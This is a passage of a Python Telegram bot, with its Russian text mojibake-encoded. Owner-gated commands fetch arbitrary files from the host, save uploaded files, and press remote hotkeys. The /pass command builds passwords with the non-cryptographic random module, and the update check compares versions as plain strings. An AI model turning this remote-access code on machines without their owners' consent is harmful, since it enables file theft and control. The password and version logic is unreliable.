        bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞: –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ (–æ—Ç 0 –¥–æ 100).")
        log.warning(f"‚ö†Ô∏è –ù–µ—á–∏—Å–ª–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –æ—Ç {user_info}: '{parts[1]}'")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")
        log.error(f"üí• –ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –≤ {command}: {e}")

@bot.message_handler(commands=['download'])
def download_file(message):
    user_info = get_user_info_string(message)
    log.info(f"CMD /download: –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –æ—Ç {user_info}")
    if not is_owner(message):
        log.warning(f"ACCESS DENIED: {user_info} –ø–æ–ø—ã—Ç–∞–ª—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å /download.")
        bot.reply_to(message, "‚õî –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
        return
    add_user_to_db(message)
    try:
        path = message.text.split(' ', 1)[1].strip()
        log.info(f"üì• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_info} –∑–∞–ø—Ä–æ—Å–∏–ª —Ñ–∞–π–ª –ø–æ –ø—É—Ç–∏: '{path}'")
        if not path:
             bot.reply_to(message, "‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É.")
             return
        if not os.path.exists(path):
            bot.reply_to(message, "üö´ –§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω –ø–æ —É–∫–∞–∑–∞–Ω–Ω–æ–º—É –ø—É—Ç–∏.")
            log.warning(f"üö´ –§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω: '{path}' (–∑–∞–ø—Ä–æ—à–µ–Ω–æ {user_info}).")
            return
        if not os.path.isfile(path):
            bot.reply_to(message, "üö´ –£–∫–∞–∑–∞–Ω–Ω—ã–π –ø—É—Ç—å –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Ñ–∞–π–ª–æ–º (–≤–æ–∑–º–æ–∂–Ω–æ, —ç—Ç–æ –ø–∞–ø–∫–∞).")
            log.warning(f"üö´ –ü—É—Ç—å –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Ñ–∞–π–ª–æ–º: '{path}' (–∑–∞–ø—Ä–æ—à–µ–Ω–æ {user_info}).")
            return
        file_size_mb = os.path.getsize(path) / (1024 * 1024)
        if file_size_mb > 50:
             bot.reply_to(message, "‚ùå –§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π. –õ–∏–º–∏—Ç 50 –ú–ë.")
             log.warning(f"‚ùå –§–∞–π–ª '{path}' —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π ({file_size_mb:.2f} MB).")
             return
        bot.send_chat_action(message.chat.id, 'upload_document')
        with open(path, 'rb') as file:
            bot.send_document(message.chat.id, file, caption=f"üìÑ –í–∞—à —Ñ–∞–π–ª: `{os.path.basename(path)}`", parse_mode='Markdown')
        log.info(f"‚úÖ –§–∞–π–ª '{path}' —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_info}.")
    except IndexError:
        bot.reply_to(message, "‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã.")
        log.warning(f"‚ö†Ô∏è –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –∞—Ä–≥—É–º–µ–Ω—Ç –ø—É—Ç–∏ –≤ /download (–∑–∞–ø—Ä–æ—à–µ–Ω–æ {user_info}).")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")
        log.error(f"üí• –ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {e}")

@bot.message_handler(commands=['upload'])
def upload_file_prompt(message):
    user_info = get_user_info_string(message)
    log.info(f"CMD /upload: –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –æ—Ç {user_info}")
    if not is_owner(message):
        log.warning(f"ACCESS DENIED: {user_info} –ø–æ–ø—ã—Ç–∞–ª—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å /upload.")
        bot.reply_to(message, "‚õî –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
        return
    add_user_to_db(message)
    user_id = message.from_user.id
    default_path = os.getcwd() 
    upload_destination[user_id] = default_path
    bot.reply_to(message, f"üìé –¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –º–Ω–µ —Ñ–∞–π–ª. –û–Ω –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ –ø–∞–ø–∫—É:\n`{default_path}`")
    log.info(f"üì§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_info} –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–ª –∑–∞–≥—Ä—É–∑–∫—É. –û–∂–∏–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ –≤ '{default_path}'.")

@bot.message_handler(content_types=['document'])
def handle_document_upload(message):
    user_info = get_user_info_string(message)
    user_id = message.from_user.id
    if user_id not in upload_destination:
        log.warning(f"‚ö†Ô∏è –ü–æ–ª—É—á–µ–Ω –¥–æ–∫—É–º–µ–Ω—Ç –æ—Ç {user_info}, –Ω–æ –∫–æ–º–∞–Ω–¥–∞ /upload –Ω–µ –±—ã–ª–∞ –≤—ã–∑–≤–∞–Ω–∞.")
        return
    if not is_owner(message):
        log.warning(f"ACCESS DENIED: {user_info} –æ—Ç–ø—Ä–∞–≤–∏–ª –¥–æ–∫—É–º–µ–Ω—Ç, –Ω–µ –±—É–¥—É—á–∏ –≤–ª–∞–¥–µ–ª—å—Ü–µ–º.")
        del upload_destination[user_id]
        return
    dest_path = upload_destination[user_id]
    try:
        file_info = bot.get_file(message.document.file_id)
        original_filename = message.document.file_name
        log.info(f"üì§ –ù–∞—á–∞–ª–æ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞ '{original_filename}' –æ—Ç {user_info}.")
        bot.send_chat_action(user_id, 'typing') 
        downloaded_file_content = bot.download_file(file_info.file_path)
        save_path = os.path.join(dest_path, original_filename)
        counter = 1
        base_name, ext = os.path.splitext(original_filename)
        while os.path.exists(save_path):
             new_filename = f"{base_name}_{counter}{ext}"
             save_path = os.path.join(dest_path, new_filename)
             counter += 1
        log.info(f"üíæ –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –∫–∞–∫ '{os.path.basename(save_path)}' –≤ –ø–∞–ø–∫—É: {dest_path}")
        with open(save_path, 'wb') as new_file:
            new_file.write(downloaded_file_content)
        bot.reply_to(message, f"‚úÖ –§–∞–π–ª '{os.path.basename(save_path)}' —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω!")
        log.info(f"‚úÖ –§–∞–π–ª —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω –ø–æ –ø—É—Ç–∏: {save_path} (–æ—Ç {user_info}).")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞: {e}")
        log.error(f"üí• –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞ –æ—Ç {user_info}: {e}")
    finally:
        if user_id in upload_destination:
            del upload_destination[user_id]
            log.info(f"üßπ –°–æ—Å—Ç–æ—è–Ω–∏–µ –æ–∂–∏–¥–∞–Ω–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ –¥–ª—è {user_info} –æ—á–∏—â–µ–Ω–æ.")

@bot.message_handler(commands=['pass'])
def generate_password(message):
    user_info = get_user_info_string(message)
    log.info(f"CMD /pass: –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –æ—Ç {user_info}")
    add_user_to_db(message)
    try:
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            raise IndexError("–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–ª–∏–Ω–∞ –ø–∞—Ä–æ–ª—è.")
        length = int(parts[1].strip())
        log.info(f"üîë –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_info} —É–∫–∞–∑–∞–ª –¥–ª–∏–Ω—É: {length}")
        if not (8 <= length <= 64):
            bot.reply_to(message, "‚ö†Ô∏è –î–ª–∏–Ω–∞ –ø–∞—Ä–æ–ª—è –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 8 –¥–æ 64 —Å–∏–º–≤–æ–ª–æ–≤.")
            log.warning(f"‚ö†Ô∏è –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –¥–ª–∏–Ω–∞ –ø–∞—Ä–æ–ª—è ({length}) –æ—Ç {user_info}.")
            return
        chars = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(random.choice(chars) for _ in range(length))
        bot.reply_to(message, f"üîë –í–∞—à –Ω–æ–≤—ã–π –ø–∞—Ä–æ–ª—å ({length} —Å–∏–º–≤.):\n\n`{password}`\n\n_(–Ω–∞–∂–º–∏—Ç–µ, —á—Ç–æ–±—ã —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å)_", parse_mode='Markdown')
        log.info(f"‚úÖ –ü–∞—Ä–æ–ª—å –¥–ª–∏–Ω–æ–π {length} —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_info}.")
    except (IndexError, ValueError):
        bot.reply_to(message, "üîê –£–∫–∞–∂–∏—Ç–µ –¥–ª–∏–Ω—É –ø–∞—Ä–æ–ª—è –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã. –ü—Ä–∏–º–µ—Ä:\n`/pass 16`")
        log.warning(f"‚ö†Ô∏è –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∏–ª–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—â–∏–π –∞—Ä–≥—É–º–µ–Ω—Ç –≤ /pass (–∑–∞–ø—Ä–æ—à–µ–Ω–æ {user_info}).")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}")
        log.error(f"üí• –ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –≤ /pass: {e}")

def check_for_updates():
    if not GITHUB_REPO_URL:
        log.info("–ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –ø—Ä–æ–ø—É—â–µ–Ω–∞: 'github_repo_url' –Ω–µ —É–∫–∞–∑–∞–Ω –≤ settings.json.")
        return
    try:
        version_url = GITHUB_REPO_URL.replace("github.com", "raw.githubusercontent.com") + "/main/version.txt"
        log.info(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –ø–æ URL: {version_url}")
        response = requests.get(version_url, timeout=5)
        response.raise_for_status()
        latest_version = response.text.strip()
        if latest_version > CURRENT_VERSION:
            log.warning(f"‚¨ÜÔ∏è –î–æ—Å—Ç—É–ø–Ω–æ –Ω–æ–≤–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ! –¢–µ–∫—É—â–∞—è: {CURRENT_VERSION}, –ü–æ—Å–ª–µ–¥–Ω—è—è: {latest_version}")
            update_message = (f"‚¨ÜÔ∏è *–î–æ—Å—Ç—É–ø–Ω–æ –Ω–æ–≤–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–ª—è –±–æ—Ç–∞!* ‚¨ÜÔ∏è\n\n- –¢–µ–∫—É—â–∞—è –≤–µ—Ä—Å–∏—è: `{CURRENT_VERSION}`\n- –ù–æ–≤–∞—è –≤–µ—Ä—Å–∏—è: `{latest_version}`\n\n–°–∫–∞—á–∞—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –º–æ–∂–Ω–æ –Ω–∞ GitHub:\n{GITHUB_REPO_URL}")
            bot.send_message(OWNER_ID, update_message, parse_mode='Markdown', disable_web_page_preview=True)
        else:
            log.info(f"‚úÖ –£ –≤–∞—Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –ø–æ—Å–ª–µ–¥–Ω—è—è –≤–µ—Ä—Å–∏—è –±–æ—Ç–∞ ({CURRENT_VERSION}).")
    except Exception as e:
        log.error(f"üí• –ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è: {e}")


@bot.message_handler(commands=['keyboard'])
def handle_keyboard_command(message):
    user_info = get_user_info_string(message)
    log.info(f"CMD /keyboard: –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –æ—Ç {user_info}")

    if not is_owner(message):
        log.warning(f"ACCESS DENIED: {user_info} –ø–æ–ø—ã—Ç–∞–ª—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å /keyboard.")
        bot.reply_to(message, "‚õî –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
        return
    
    parts = message.text.split(' ', 1)
    if len(parts) > 1:
        # –ï—Å–ª–∏ –∫–æ–º–±–∏–Ω–∞—Ü–∏—è –ø–µ—Ä–µ–¥–∞–Ω–∞ —Å—Ä–∞–∑—É —Å –∫–æ–º–∞–Ω–¥–æ–π
        keys_str = parts[1]
        log.info(f"‚å®Ô∏è {user_info} –ø–µ—Ä–µ–¥–∞–ª –∫–æ–º–±–∏–Ω–∞—Ü–∏—é —Å—Ä–∞–∑—É: '{keys_str}'")
        process_hotkey_press(message, keys_str)
    else:
        # –ï—Å–ª–∏ –∫–æ–º–∞–Ω–¥–∞ –±–µ–∑ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤, –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –≤–≤–æ–¥
        awaiting_hotkey.add(message.from_user.id)
        bot.reply_to(message, "‚å®Ô∏è –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏—é –∫–ª–∞–≤–∏—à –¥–ª—è –Ω–∞–∂–∞—Ç–∏—è.\n–ù–∞–ø—Ä–∏–º–µ—Ä: `alt+f4` –∏–ª–∏ `win+d`", parse_mode='Markdown')
        log.info(f"‚å®Ô∏è {user_info} –∑–∞–ø—Ä–æ—Å–∏–ª –≤–≤–æ–¥ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ –∫–ª–∞–≤–∏—à.")

def process_hotkey_press(message, keys_str: str):
    """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –Ω–∞–∂–∞—Ç–∏–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ –∫–ª–∞–≤–∏—à."""
    user_id = message.from_user.id
    user_info = get_user_info_string(message)
    
    try:
        keys_to_press = [key.strip().lower() for key in keys_str.split('+')]
        if not all(keys_to_press): # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø—É—Å—Ç—ã–µ –∫–ª–∞–≤–∏—à–∏ —Ç–∏–ø–∞ "alt++f4"
            bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞: –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏.")
            return

        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å –∫–ª–∞–≤–∏—à
        invalid_keys = [key for key in keys_to_press if key not in pyautogui.KEYBOARD_KEYS]
        if invalid_keys:
            bot.reply_to(message, f"‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–µ –∫–ª–∞–≤–∏—à–∏: `{', '.join(invalid_keys)}`")
            log.warning(f"‚ö†Ô∏è {user_info} –≤–≤–µ–ª –Ω–µ–≤–µ—Ä–Ω—ã–µ –∫–ª–∞–≤–∏—à–∏: {invalid_keys}")
            return

        log.info(f"–ù–∞–∂–∏–º–∞—é –∫–æ–º–±–∏–Ω–∞—Ü–∏—é '{'+'.join(keys_to_press)}' –¥–ª—è {user_info} —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã...")
        bot.reply_to(message, f"‚è≥ –ù–∞–∂–∏–º–∞—é `{'+'.join(keys_to_press)}` —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã...\n*–ü–µ—Ä–µ–∫–ª—é—á–∏—Ç–µ—Å—å –Ω–∞ –Ω—É–∂–Ω–æ–µ –æ–∫–Ω–æ!*", parse_mode='Markdown')
        time.sleep(3)

        pyautogui.hotkey(*keys_to_press)
        
        bot.reply_to(message, f"‚úÖ –ö–æ–º–±–∏–Ω–∞—Ü–∏—è `{'+'.join(keys_to_press)}` —É—Å–ø–µ—à–Ω–æ –Ω–∞–∂–∞—Ç–∞.")
        log.info(f"‚úÖ –ö–æ–º–±–∏–Ω–∞—Ü–∏—è '{'+'.join(keys_to_press)}' —É—Å–ø–µ—à–Ω–æ –Ω–∞–∂–∞—Ç–∞ –¥–ª—è {user_info}.")

    except Exception as e:
        bot.reply_to(message, f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ –∫–ª–∞–≤–∏—à: {e}")
        log.error(f"üí• –û—à–∏–±–∫–∞ pyautogui –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ '{keys_str}' –¥–ª—è {user_info}: {e}")
    finally:
        # –£–±–∏—Ä–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ —Å–æ—Å—Ç–æ—è–Ω–∏—è –æ–∂–∏–¥–∞–Ω–∏—è, –µ—Å–ª–∏ –æ–Ω —Ç–∞–º –±—ã–ª
        awaiting_hotkey.discard(user_id)        

# --- 5. –ó–ê–ü–£–°–ö –ë–û–¢–ê ---
if __name__ == '__main__':
    log.info("üöÄ –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ. –ù–∞—á–∏–Ω–∞—é polling...")
    try:
        check_for_updates()
        bot.polling(none_stop=True)
    except Exception as e:
        log.critical(f"üí• –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –û–®–ò–ë–ö–ê POLLING. –ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: {e}")